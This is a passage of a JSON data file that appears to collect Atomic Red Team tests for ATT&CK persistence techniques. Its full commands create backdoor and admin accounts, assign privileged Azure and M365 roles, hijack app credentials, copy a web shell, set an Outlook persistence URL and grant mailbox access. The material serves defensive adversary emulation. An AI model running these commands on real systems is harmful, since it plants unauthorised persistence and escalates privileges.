ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }"
         },
         {
            "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
            "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"lower-long-special-333\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString lower-long-special-333 -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to lower-long-special-333\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"lower-long-special-333\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }"
         },
         {
            "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
            "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"UpperLowerLong333noSpecialChar\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString UpperLowerLong333noSpecialChar -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong333noSpecialChar\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong333noSpecialChar\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }"
         },
         {
            "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
            "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"UPPER-LONG-SPECIAL-333\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString UPPER-LONG-SPECIAL-333 -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to UPPER-LONG-SPECIAL-333\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UPPER-LONG-SPECIAL-333\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }"
         },
         {
            "description": "Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). \n\nThe quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,\nyou need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to \ncreate the user and alter the group. Automatic installation of the dependency requires an elevated session, \nand is unlikely to work with Powershell Core (untested).\n\nIf you consider running this test against a production Active Directory, the good practise is to create a dedicated\nservice account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated\nas group manager of the target group.\n\nExample: `Invoke-AtomicTest -Session $session 'T1098' -TestNames \"Domain Account and Group Manipulate\" -InputArgs @{\"group\" = \"DNSAdmins\" }`\n",
            "command": "Try {;     Import-Module ActiveDirectory -ErrorAction Stop | Out-Null;      ; } ; Catch {;     if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {;   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online; } else {;   Install-WindowsFeature RSAT-AD-PowerShell; }; };  ;  $x = Get-Random -Minimum 2 -Maximum 99; $y = Get-Random -Minimum 2 -Maximum 99; $z = Get-Random -Minimum 2 -Maximum 99; $w = Get-Random -Minimum 2 -Maximum 99; Import-Module ActiveDirectory; $account = \"#{account_prefix}-$x$y$z\"; New-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False; Add-ADGroupMember \"#{group}\" $account"
         },
         {
            "description": "Change the password on the Directory Service Restore Mode (DSRM) account using ntdsutil by syncing to existing account\n",
            "command": "ntdsutil \"set dsrm password\" \"sync from domain account %username%\" \"q\" \"q\""
         },
         {
            "description": "The adversaries want to add user to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to the user principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see User as a type.\n",
            "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name AzureAD -Force};  ;  Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential; $user = Get-AzureADUser -Filter \"DisplayName eq 'SuperUser' or UserPrincipalName eq 'SuperUser'\"; if ($user -eq $null) { Write-Warning \"User not found\"; exit }; $role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId; Write-Host \"User $($user.DisplayName) was added to $($role.DisplayName) role\""
         },
         {
            "description": "The adversaries want to add permission to newly created application. Application could be then used for persistence or for further operation in the attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor.\nThis technique will create a new app, with the provided name, and give it the provided permission. But if you prefer to add credentials to an existing app, replace in the code: \"Get-AzureADApplication\" instead of \"New-AzureADServicePrincipal\".\nThe DirectoryRecommendations.Read.All permissions has been selected as the default.\n\nThe account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.\n\nDetection hint - check Operation Name \"Add app role assignment to service principal\" in subscriptions Activity Logs.\nYou can also take a look at the materials:\nhttps://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/\nhttps://github.com/reprise99/Sentinel-Queries\nhttps://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766\nhttps://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb\n",
            "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name AzureAD -Force};  ;  Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential; $aadApplication = New-AzureADApplication -DisplayName \"test_app\"; $servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId; $graphSP = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"; $requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess; $requiredGraphAccess.ResourceAppId = $graphSP.AppId; $requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]; $ApplicationPermissions = @('DirectoryRecommendations.Read.All'); $reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}; if($reqPermission); {; $resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess; $resourceAccess.Type = \"Role\"; $resourceAccess.Id = $reqPermission.Id    ; $requiredGraphAccess.ResourceAccess.Add($resourceAccess); }; else; {; Write-Host \"App permission $permission not found in the Graph Resource API\" -ForegroundColor Red; }; $requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]; $requiredResourcesAccess.Add($requiredGraphAccess); Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess; $servicePrincipal = Get-AzureADServicePrincipal -Filter \"AppId eq '$($aadApplication.AppId)'\"; New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id"
         },
         {
            "description": "The adversaries want to add user to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to user in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n",
            "command": "try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name Az.Resources -Force};  ;  Import-Module -Name Az.Resources; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzAccount -Credential $Credential; $user = Get-AzADUser | where-object {$_.DisplayName -eq \"SuperUser\" -or $_.UserPrincipalName -eq \"SuperUser\" }; if ($user -eq $null) { Write-Warning \"User not found\"; exit }; $subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"}; if ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }; $role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription; Write-Host \"User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\""
         }
      ]
   },
   "T1136.001": {
      "technique_name": "Create Account: Local Account",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "Create a user via useradd\n",
            "command": "useradd -M -N -r -s /bin/bash -c evil_account evil_user"
         },
         {
            "description": "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_CMD\"\n",
            "command": "net user /add \"T1136.001_CMD\" \"T1136.001_CMD!\""
         },
         {
            "description": "Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n",
            "command": "useradd -g 0 -M -d /root -s /bin/bash butter; if [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"butter:BetterWithButter\" | sudo chpasswd; else echo \"BetterWithButter\" | passwd --stdin butter; fi; "
         },
         {
            "description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"\n",
            "command": "New-LocalUser -Name \"T1136.001_PowerShell\" -NoPassword"
         },
         {
            "description": "Creates a new admin user in a command prompt.\n",
            "command": "net user /add \"#{username}\" \"#{password}\" && net localgroup administrators \"#{username}\" /add"
         },
         {
            "description": "Creates a user on a MacOS system with dscl\n",
            "command": "dscl . -create /Users/evil_user; dscl . -create /Users/evil_user UserShell /bin/zsh; dscl . -create /Users/evil_user RealName \"Evil Account\"; dscl . -create /Users/evil_user UniqueID \"1010\"; dscl . -create /Users/evil_user PrimaryGroupID 80; dscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user"
         }
      ]
   },
   "T1098.003": {
      "technique_name": "Account Manipulation: Additional Cloud Roles",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "This test looks at simulating the an adversary described in the following blog post. It involves resetting the password of a normal user and adding to the company administrator role within M365.\n Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges\n",
            "command": "Import-Module MSOnline; Import-Module AzureAD; $password = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $password; $targetsecurepw = ConvertTo-SecureString -String \"Ohn05GeMe#$\" -AsPlainText -Force; Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue; Connect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue; $target_objid = Get-AzureADUser -filter \"userPrincipalName eq 'default'\" | Select-Object -ExpandProperty ObjectId; Set-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue; Add-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"default\"; Add-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberEmailAddress \"default\""
         },
         {
            "description": "Add an existing Azure user account the Company Administrator Role.\n",
            "command": "Import-Module MSOnline; $Password = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Password; Connect-MsolService -Credential $Credential; Add-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"default\""
         }
      ]
   },
   "T1505.003": {
      "technique_name": "Server Software Component: Web Shell",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n",
            "command": "xcopy /I /Y \"PathToAtomicsFolder\\T1505.003\\src\" C:\\inetpub\\wwwroot"
         }
      ]
   },
   "T1098.004": {
      "technique_name": "SSH Authorized Keys",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "Modify contents of <user-home>/.ssh/authorized_keys to maintain persistence on victim host. \nIf the user is able to save the same contents in the authorized_keys file, it shows user can modify the file.\n",
            "command": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo \"$ssh_authorized_keys\" > ~/.ssh/authorized_keys; fi; "
         }
      ]
   },
   "T1505.002": {
      "technique_name": "Server Software Component: Transport Agent",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n",
            "command": "Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll; Enable-TransportAgent Security Interop Agent; Get-TransportAgent | Format-List Name,Enabled"
         }
      ]
   },
   "T1098.001": {
      "technique_name": "Account Manipulation: Additional Cloud Credentials",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "Add a certificate to an Application through its App Registration. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
            "command": "Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential > $null; $app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1; if ($app -eq $null) { Write-Warning \"Application not found\"; exit }; $credNotAfter = (Get-Date).AddDays(1); $certNotAfter = (Get-Date).AddDays(2); $cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter; $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData()); Write-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"; New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter; Start-Sleep -s 30; $tenant = Get-AzureADTenantDetail; $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint; Write-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"; Write-Host \"End of Hijacking\""
         },
         {
            "description": "Adversaries create their own new access and secret keys to programatically interact with AWS environment, which is already compromised\n",
            "command": "aws iam create-access-key --user-name atomicredteam > \"$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\"; cd \"$PathToAtomicsFolder/T1098.001/bin/\"; ./aws_secret.sh"
         },
         {
            "description": "Add a certificate to an Application through its Service Principal. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
            "command": "Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential > $null; $sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $credNotAfter = (Get-Date).AddDays(1); $certNotAfter = (Get-Date).AddDays(2); $cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter; $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData()); Write-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"; New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter; Start-Sleep -s 30; $tenant = Get-AzureADTenantDetail; $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint; Write-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"; Write-Host \"End of Hijacking\""
         }
      ]
   },
   "T1136.003": {
      "technique_name": "Create Account: Cloud Account",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "Creates a new IAM user in AWS. Upon successful creation, a new user will be created. Adversaries create new IAM users so that their malicious activity do not interupt the normal functions of the compromised users and can remain undetected for a long time\n",
            "command": "aws iam create-user --user-name atomicredteam"
         },
         {
            "description": "Creates a new user in Azure AD. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.",
            "command": "Connect-AzureAD; $userprincipalname = \"atomicredteam@yourdomain.com\"; $username = \"atomicredteam\"      ; $password = \"reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg\"; $PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile; $PasswordProfile.Password = $password; New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username"
         },
         {
            "description": "Creates a new user in Azure AD via the Azure CLI. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.",
            "command": "az login; $userprincipalname = \"atomicredteam@yourdomain.com\"; $username = \"atomicredteam\"      ; $password = \"reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg\"; az ad user create --display-name $username --password $password --user-principal-name $userprincipalname; az ad user list --filter \"displayname eq 'atomicredteam'\""
         }
      ]
   },
   "T1176": {
      "technique_name": "Browser Extensions",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "This test loads an unpacked extension in Google Chrome with the `--load-extension` parameter. This technique was previously used by the Grandoreiro malware to load a malicious extension that would capture the browsing history, steal cookies and other user information. Other malwares also leverage this technique to hijack searches, steal passwords, inject ads, and more.\n\nReferences:\nhttps://attack.mitre.org/techniques/T1176/\nhttps://securityintelligence.com/posts/grandoreiro-malware-now-targeting-banks-in-spain/",
            "command": "$chromium =  \"https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip\"; $extension = \"https://github.com/gorhill/uBlock/releases/download/uBOLite_0.1.23.6055/uBOLite_0.1.23.6055.chromium.mv3.zip\"; Set-Location \"$env:TEMP\"; Set-Variable ProgressPreference SilentlyContinue; Invoke-WebRequest -URI $chromium -OutFile \"$env:TEMP\\chrome.zip\"; Invoke-WebRequest -URI $extension -OutFile \"$env:TEMP\\extension.zip\"; Expand-Archive chrome.zip -DestinationPath \"$env:TEMP\" -Force; Expand-Archive extension.zip -Force; Start-Process .\\chrome-win\\chrome.exe --load-extension=\"$env:TEMP\\extension\\\" -PassThru"
         }
      ]
   },
   "T1137.004": {
      "technique_name": "Office Application Startup: Outlook Home Page",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.\n\nTriggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).\n",
            "command": "reg.exe add HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\WebView\\Inbox /v URL /t REG_SZ /d file://d43bfc_T1137.004.html /f"
         }
      ]
   },
   "T1098.002": {
      "technique_name": "Account Manipulation: Additional Email Delegate Permissions",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "Give a nominated user, full mailbox delegation access of another user.\nThis can be used by an adversary to maintain persistent access to a target's mailbox in M365.\n",
            "command": "Import-Module ExchangeOnlineManagement; $secure_pwd = \"o365_password_test\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"o365_user_test@contoso.com\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Add-MailboxPermission -Identity \"delegate@contoso.com\" -User \"operator@contoso.com\" -AccessRights FullAccess -InheritanceType All; Disconnect-ExchangeOnline -Confirm:$false"
         }
      ]
   },
